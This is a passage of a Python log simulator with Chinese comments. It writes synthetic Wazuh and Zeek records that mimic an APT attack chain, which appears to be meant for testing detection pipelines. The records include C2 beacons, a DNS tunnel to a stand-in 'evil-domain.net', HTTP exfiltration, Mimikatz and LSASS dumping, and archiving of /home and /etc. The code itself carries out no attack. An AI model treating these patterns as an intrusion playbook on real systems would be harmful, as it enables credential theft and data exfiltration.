                    args=["tar", "-czvf", "/tmp/data.tar.gz", "/home", "/etc"],
                    rule_level=10,
                    rule_groups=["attack", "collection", "T1560"]
                )
            )
    
    def command_and_control_beacon(self, host: Host, attacker: Attacker):
        """
        命令与控制 - C2 信标 (T1071)
        """
        c2_ip = attacker.ip
        c2_domain = self.env.get_random_c2()
        
        # DNS 查询 C2 域名
        if "." in c2_domain and not c2_domain[0].isdigit():
            self.logs_buffer["zeek_dns"].append(
                self.log.zeek_dns(
                    src_ip=host.ip,
                    dns_server="8.8.8.8",
                    query=c2_domain,
                    answers=[c2_ip]
                )
            )
        
        # HTTPS C2 通信
        self.logs_buffer["zeek_conn"].append(
            self.log.zeek_conn(
                src_ip=host.ip,
                src_port=random.randint(49152, 65535),
                dst_ip=c2_ip,
                dst_port=443,
                duration=random.uniform(300.0, 3600.0),  # 长连接
                orig_bytes=random.randint(1000, 50000),
                resp_bytes=random.randint(5000, 200000)
            )
        )
        
        # HTTP Beacon
        self.logs_buffer["zeek_http"].append(
            self.log.zeek_http(
                src_ip=host.ip,
                dst_ip=c2_ip,
                method="POST",
                host=c2_domain if "." in c2_domain else c2_ip,
                uri="/api/beacon",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                dst_port=443
            )
        )
    
    def command_and_control_dns_tunnel(self, host: Host):
        """
        命令与控制 - DNS 隧道 (T1071.004)
        """
        # 生成随机的 DNS 隧道查询（Base64 编码数据）
        encoded_data = ''.join(random.choices(string.ascii_lowercase + string.digits, k=60))
        tunnel_query = f"{encoded_data}.tunnel.evil-domain.net"
        
        self.logs_buffer["zeek_dns"].append(
            self.log.zeek_dns(
                src_ip=host.ip,
                dns_server="8.8.8.8",
                query=tunnel_query,
                qtype="TXT"
            )
        )
    
    def exfiltration_http(self, host: Host, attacker: Attacker):
        """
        数据外泄 - HTTP 外泄 (T1048.003)
        """
        # 大文件上传
        self.logs_buffer["zeek_http"].append(
            self.log.zeek_http(
                src_ip=host.ip,
                dst_ip=attacker.ip,
                method="POST",
                host=attacker.ip,
                uri="/upload/data.7z",
                user_agent="curl/7.68.0"
            )
        )
        
        # 文件传输记录
        self.logs_buffer["zeek_files"].append(
            self.log.zeek_files(
                src_ip=host.ip,
                dst_ip=attacker.ip,
                mime_type="application/octet-stream",
                seen_bytes=random.randint(10485760, 104857600),  # 10MB-100MB
                dst_port=443
            )
        )
        
        # 大量数据传输的连接
        self.logs_buffer["zeek_conn"].append(
            self.log.zeek_conn(
                src_ip=host.ip,
                src_port=random.randint(49152, 65535),
                dst_ip=attacker.ip,
                dst_port=443,
                duration=random.uniform(60.0, 600.0),
                orig_bytes=random.randint(10485760, 104857600),  # 大量外发
                resp_bytes=random.randint(1000, 10000)  # 少量响应
            )
        )
    
    def normal_activity(self, host: Host):
        """
        正常活动 - 用于混淆
        """
        if host.os == "windows":
            normal_processes = [
                ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
                ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe"),
                ("explorer.exe", "C:\\Windows\\explorer.exe", "explorer.exe"),
                ("notepad.exe", "C:\\Windows\\System32\\notepad.exe", "notepad.exe"),
            ]
            proc, path, cmd = random.choice(normal_processes)
            self.logs_buffer["wazuh"].append(
                self.log.wazuh_process_create_windows(
                    host=host,
                    process_name=proc,
                    process_path=path,
                    command_line=cmd,
                    parent_process="explorer.exe",
                    user=f"{host.name}\\user",
                    rule_level=3,
                    rule_desc="Normal process activity"
                )
            )
        
        # 正常 DNS 查询
        normal_domains = ["google.com", "microsoft.com", "github.com", "stackoverflow.com", "aws.amazon.com"]
        self.logs_buffer["zeek_dns"].append(
            self.log.zeek_dns(
                src_ip=host.ip,
                dns_server="8.8.8.8",
                query=random.choice(normal_domains)
            )
        )
        
        # 正常 HTTP 流量
        self.logs_buffer["zeek_http"].append(
            self.log.zeek_http(
                src_ip=host.ip,
                dst_ip=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                method="GET",
                host=random.choice(normal_domains),
                uri="/",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            )
        )
    
    def _get_host_key(self, host: Host) -> str:
        """获取主机在环境中的 key"""
        for key, h in self.env.hosts.items():
            if h.id == host.id:
                return key
        return ""


# ==========================================
# 测试场景
# ==========================================

class TestScenarios:
    """测试场景集合"""
    
    def __init__(self):
        self.env = SimulatedEnvironment()
        self.log_gen = LogGenerator(self.env)
        self.attack_sim = AttackSimulator(self.env, self.log_gen)
    
    async def run_full_attack_chain(self, interval: float = 3.0):
        """
        完整攻击链测试
        模拟 APT 攻击的完整生命周期
        """
        print("=" * 70)
        print("🔴 完整攻击链测试")
        print("模拟 APT 组织的完整攻击流程")
        print("=" * 70)
        
        attacker = self.env.get_random_attacker()
        initial_target = self.env.get_random_host(role="Victim", os="windows")
        
        stages = [
            ("1️⃣ 初始访问 - 钓鱼攻击", lambda: self.attack_sim.initial_access_phishing(initial_target, attacker)),
            ("2️⃣ 执行 - 命令解释器", lambda: self.attack_sim.execution_command_shell(initial_target)),
            ("3️⃣ 持久化 - 注册表启动项", lambda: self.attack_sim.persistence_registry_run_key(initial_target)),
            ("4️⃣ 持久化 - 计划任务", lambda: self.attack_sim.persistence_scheduled_task(initial_target)),
            ("5️⃣ 权限提升 - 令牌操作", lambda: self.attack_sim.privilege_escalation_token_manipulation(initial_target)),
            ("6️⃣ 防御规避 - 禁用杀软", lambda: self.attack_sim.defense_evasion_disable_defender(initial_target)),
            ("7️⃣ 凭据访问 - Mimikatz", lambda: self.attack_sim.credential_access_mimikatz(initial_target)),
            ("8️⃣ 凭据访问 - LSASS 转储", lambda: self.attack_sim.credential_access_lsass_dump(initial_target)),
            ("9️⃣ 发现 - 系统信息收集", lambda: self.attack_sim.discovery_system_info(initial_target)),
        ]
        
        # 执行初始攻击阶段
        for i, (stage_name, action) in enumerate(stages):
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {stage_name}")
            action()
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            # 添加一些正常活动作为噪声
            for _ in range(random.randint(1, 3)):
                self.attack_sim.normal_activity(self.env.get_random_host())
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            await asyncio.sleep(interval)
        
        # 横向移动阶段
        lateral_targets = [
            self.env.hosts["srv-01"],  # AD 服务器
            self.env.hosts["srv-04"],  # 文件服务器
            self.env.hosts["ws-03"],   # 财务 PC
        ]
        
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🔟 横向移动阶段")
        for target in lateral_targets:
            print(f"  └── 攻击目标: {target.name} ({target.ip})")
            
            if random.random() > 0.5:
                self.attack_sim.lateral_movement_psexec(initial_target, target)
            else:
                self.attack_sim.lateral_movement_wmi(initial_target, target)
            
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            await asyncio.sleep(interval)
        
        # C2 通信
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 1️⃣1️⃣ 命令与控制通信")
        for host_key in self.env.compromised_hosts[:3]:
            host = self.env.hosts.get(host_key)
            if host:
                self.attack_sim.command_and_control_beacon(host, attacker)
                self.attack_sim.command_and_control_dns_tunnel(host)
        
        self.attack_sim.flush_to_files()
        self.attack_sim.clear_buffer()
        await asyncio.sleep(interval)
        
        # 数据收集和外泄
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 1️⃣2️⃣ 数据收集")
        high_value_host = self.env.hosts["srv-04"]
        self.attack_sim.collection_archive_data(high_value_host)
        self.attack_sim.flush_to_files()
        self.attack_sim.clear_buffer()
        await asyncio.sleep(interval)
        
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 1️⃣3️⃣ 数据外泄")
        self.attack_sim.exfiltration_http(high_value_host, attacker)
        self.attack_sim.flush_to_files()
        self.attack_sim.clear_buffer()
        
        # 清除痕迹
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 1️⃣4️⃣ 防御规避 - 清除日志")
        self.attack_sim.defense_evasion_clear_logs(initial_target)
        self.attack_sim.flush_to_files()
        self.attack_sim.clear_buffer()
        
        print("\n" + "=" * 70)
        print("✅ 完整攻击链测试完成")
        print(f"沦陷主机: {len(self.env.compromised_hosts)} 台")
        print("=" * 70)
    
    async def run_stress_test(self, duration: int = 60, eps: int = 100):
        """
        压力测试 - 生成大量日志
        """
        print("=" * 70)
        print(f"⚡ 压力测试模式")
        print(f"目标: {eps} 事件/秒, 持续 {duration} 秒")
        print("=" * 70)
        
        start_time = datetime.now()
        event_count = 0
        
        while (datetime.now() - start_time).seconds < duration:
            # 生成一批事件
            for _ in range(eps):
                host = self.env.get_random_host()
                
                # 随机生成不同类型的日志
                log_type = random.choices(
                    ["process", "network", "dns", "http", "file"],
                    weights=[30, 25, 20, 15, 10]
                )[0]
                
                if log_type == "process":
                    if host.os == "windows":
                        self.attack_sim.logs_buffer["wazuh"].append(
                            self.log_gen.wazuh_process_create_windows(
                                host=host,
                                process_name="stress_test.exe",
                                process_path="C:\\Windows\\System32\\stress_test.exe",
                                command_line="stress_test.exe",
                                rule_level=random.randint(3, 12)
                            )
                        )
                    else:
                        self.attack_sim.logs_buffer["wazuh"].append(
                            self.log_gen.wazuh_linux_auditd(
                                host=host,
                                command="stress_test",
                                exe_path="/usr/bin/stress_test",
                                args=["stress_test", "--test"]
                            )
                        )
                elif log_type == "network":
                    self.attack_sim.logs_buffer["zeek_conn"].append(
                        self.log_gen.zeek_conn(
                            src_ip=host.ip,
                            src_port=random.randint(49152, 65535),
                            dst_ip=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            dst_port=random.choice([80, 443, 22, 3389, 445])
                        )
                    )
                elif log_type == "dns":
                    self.attack_sim.logs_buffer["zeek_dns"].append(
                        self.log_gen.zeek_dns(
                            src_ip=host.ip,
                            dns_server="8.8.8.8",
                            query=f"test{random.randint(1,10000)}.example.com"
                        )
                    )
                elif log_type == "http":
                    self.attack_sim.logs_buffer["zeek_http"].append(
                        self.log_gen.zeek_http(
                            src_ip=host.ip,
                            dst_ip=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            method=random.choice(["GET", "POST"]),
                            host="stress-test.example.com",
                            uri=f"/api/test/{random.randint(1,1000)}"
                        )
                    )
                else:
                    self.attack_sim.logs_buffer["zeek_files"].append(
                        self.log_gen.zeek_files(
                            src_ip=host.ip,
                            dst_ip=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                            mime_type=random.choice(["text/html", "application/json", "image/jpeg"]),
                            seen_bytes=random.randint(1024, 1048576)
                        )
                    )
                
                event_count += 1
            
            # 写入文件
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            # 每秒报告
            elapsed = (datetime.now() - start_time).seconds + 1
            actual_eps = event_count / elapsed
            print(f"\r[{elapsed}s] 已生成 {event_count} 事件, 实际 EPS: {actual_eps:.0f}", end="")
            
            await asyncio.sleep(1)
        
        print(f"\n\n✅ 压力测试完成: 共生成 {event_count} 条日志")
    
    async def run_discovery_test(self, new_hosts: int = 5, interval: float = 5.0):
        """
        资产发现测试 - 模拟新主机上线
        """
        print("=" * 70)
        print(f"🔍 资产发现测试")
        print(f"将模拟 {new_hosts} 台新主机上线")
        print("=" * 70)
        
        for i in range(new_hosts):
            # 创建新主机
            new_id = f"{200 + i}"
            new_name = f"NewHost-{i+1:03d}"
            new_ip = f"192.168.2.{100 + i}"
            new_os = random.choice(["windows", "linux"])
            
            new_host = Host(
                id=new_id,
                name=new_name,
                ip=new_ip,
                os=new_os,
                role="Victim"
            )
            
            self.env.hosts[f"new-{i}"] = new_host
            
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 新主机上线: {new_name} ({new_ip}, {new_os})")
            
            # 生成该主机的日志
            if new_os == "windows":
                self.attack_sim.logs_buffer["wazuh"].append(
                    self.log_gen.wazuh_process_create_windows(
                        host=new_host,
                        process_name="svchost.exe",
                        process_path="C:\\Windows\\System32\\svchost.exe",
                        command_line="svchost.exe -k netsvcs",
                        rule_level=3,
                        rule_desc="System service started"
                    )
                )
            else:
                self.attack_sim.logs_buffer["wazuh"].append(
                    self.log_gen.wazuh_linux_auditd(
                        host=new_host,
                        command="systemd",
                        exe_path="/lib/systemd/systemd",
                        args=["systemd", "--system"],
                        rule_level=3
                    )
                )
            
            # 网络活动
            self.attack_sim.logs_buffer["zeek_conn"].append(
                self.log_gen.zeek_conn(
                    src_ip=new_ip,
                    src_port=random.randint(49152, 65535),
                    dst_ip="8.8.8.8",
                    dst_port=53
                )
            )
            
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            await asyncio.sleep(interval)
        
        print("\n" + "=" * 70)
        print(f"✅ 资产发现测试完成")
        print(f"新增主机: {new_hosts} 台")
        print("=" * 70)
    
    async def run_lateral_movement_test(self, iterations: int = 10, interval: float = 3.0):
        """
        横向移动专项测试
        """
        print("=" * 70)
        print(f"🔄 横向移动专项测试")
        print(f"将模拟 {iterations} 次横向移动")
        print("=" * 70)
        
        # 首先沦陷一台初始主机
        initial = self.env.get_random_host(role="Victim", os="windows")
        self.env.compromise_host(self._get_host_key(initial))
        print(f"\n初始沦陷主机: {initial.name} ({initial.ip})")
        
        for i in range(iterations):
            # 随机选择已沦陷主机作为源
            source_key = random.choice(self.env.compromised_hosts)
            source = self.env.hosts.get(source_key)
            
            # 随机选择未沦陷主机作为目标
            target = self.env.get_random_host(exclude_compromised=True)
            
            if not source or source.id == target.id:
                continue
            
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 横向移动 #{i+1}")
            print(f"  源: {source.name} ({source.ip})")
            print(f"  目标: {target.name} ({target.ip})")
            
            # 随机选择横向移动技术
            technique = random.choice(["psexec", "wmi", "ssh"])
            
            if technique == "psexec" and source.os == "windows" and target.os == "windows":
                self.attack_sim.lateral_movement_psexec(source, target)
            elif technique == "wmi" and source.os == "windows" and target.os == "windows":
                self.attack_sim.lateral_movement_wmi(source, target)
            elif technique == "ssh" or target.os == "linux":
                self.attack_sim.lateral_movement_ssh(source, target)
            else:
                self.attack_sim.lateral_movement_psexec(source, target)
            
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            await asyncio.sleep(interval)
        
        print("\n" + "=" * 70)
        print(f"✅ 横向移动测试完成")
        print(f"沦陷主机总数: {len(self.env.compromised_hosts)}")
        print("=" * 70)
    
    async def run_demo_mode(self, interval: float = 5.0):
        """
        演示模式 - 慢速展示各种攻击技术
        """
        print("=" * 70)
        print("🎬 演示模式")
        print("将逐步展示各种攻击技术")
        print("=" * 70)
        
        attacker = self.env.attackers["apt-28"]
        
        demos = [
            ("钓鱼攻击", lambda h: self.attack_sim.initial_access_phishing(h, attacker), "windows"),
            ("PowerShell 执行", lambda h: self.attack_sim.execution_command_shell(h), "windows"),
            ("Linux 命令执行", lambda h: self.attack_sim.execution_command_shell(h), "linux"),
            ("注册表持久化", lambda h: self.attack_sim.persistence_registry_run_key(h), "windows"),
            ("计划任务持久化", lambda h: self.attack_sim.persistence_scheduled_task(h), "windows"),
            ("Cron 持久化", lambda h: self.attack_sim.persistence_scheduled_task(h), "linux"),
            ("Mimikatz 凭据转储", lambda h: self.attack_sim.credential_access_mimikatz(h), "windows"),
            ("LSASS 内存转储", lambda h: self.attack_sim.credential_access_lsass_dump(h), "windows"),
            ("系统信息发现", lambda h: self.attack_sim.discovery_system_info(h), "windows"),
            ("Linux 信息发现", lambda h: self.attack_sim.discovery_system_info(h), "linux"),
            ("C2 信标通信", lambda h: self.attack_sim.command_and_control_beacon(h, attacker), None),
            ("DNS 隧道", lambda h: self.attack_sim.command_and_control_dns_tunnel(h), None),
            ("数据归档", lambda h: self.attack_sim.collection_archive_data(h), "windows"),
            ("数据外泄", lambda h: self.attack_sim.exfiltration_http(h, attacker), None),
            ("日志清除", lambda h: self.attack_sim.defense_evasion_clear_logs(h), "windows"),
        ]
        
        for name, action, required_os in demos:
            host = self.env.get_random_host(os=required_os) if required_os else self.env.get_random_host()
            
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 演示: {name}")
            print(f"  目标主机: {host.name} ({host.ip})")
            
            action(host)
            self.attack_sim.flush_to_files()
            self.attack_sim.clear_buffer()
            
            await asyncio.sleep(interval)
        
        print("\n" + "=" * 70)
        print("✅ 演示模式完成")
        print("=" * 70)
    
    def _get_host_key(self, host: Host) -> str:
        """获取主机 key"""
        for key, h in self.env.hosts.items():
            if h.id == host.id:
                return key
        return ""


# ==========================================
# 主程序
# ==========================================

async def main():
    import sys
    
    # 解析命令行参数
    mode = sys.argv[1] if len(sys.argv) > 1 else "full_chain"
    interval = float(sys.argv[2]) if len(sys.argv) > 2 else 3.0
    
    # 确保日志目录存在
    for path in LOG_PATHS.values():
        path.parent.mkdir(parents=True, exist_ok=True)
    
    scenarios = TestScenarios()
    
    try:
        if mode == "full_chain":
            await scenarios.run_full_attack_chain(interval=interval)
        elif mode == "stress":
            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
            eps = int(sys.argv[4]) if len(sys.argv) > 4 else 100
            await scenarios.run_stress_test(duration=duration, eps=eps)
        elif mode == "discovery":
            new_hosts = int(sys.argv[3]) if len(sys.argv) > 3 else 5
            await scenarios.run_discovery_test(new_hosts=new_hosts, interval=interval)
        elif mode == "lateral":
            iterations = int(sys.argv[3]) if len(sys.argv) > 3 else 10
            await scenarios.run_lateral_movement_test(iterations=iterations, interval=interval)
        elif mode == "demo":
            await scenarios.run_demo_mode(interval=interval)
        else:
            print(f"未知模式: {mode}")
            print("\n可用模式:")
            print("  full_chain - 完整攻击链测试（默认）")
            print("  stress     - 压力测试")
            print("  discovery  - 资产发现测试")
            print("  lateral    - 横向移动专项测试")
            print("  demo       - 演示模式")
            print("\n使用示例:")
            print("  python advanced_log_simulator.py full_chain 3")
            print("  python advanced_log_simulator.py stress 3 60 100")
            print("  python advanced_log_simulator.py discovery 5 5")
            print("  python advanced_log_simulator.py lateral 10 3")
            print("  python advanced_log_simulator.py demo 5")
    
    except KeyboardInterrupt:
        print("\n\n⚠️ 用户中断")


if __name__ == "__main__":
    asyncio.run(main())
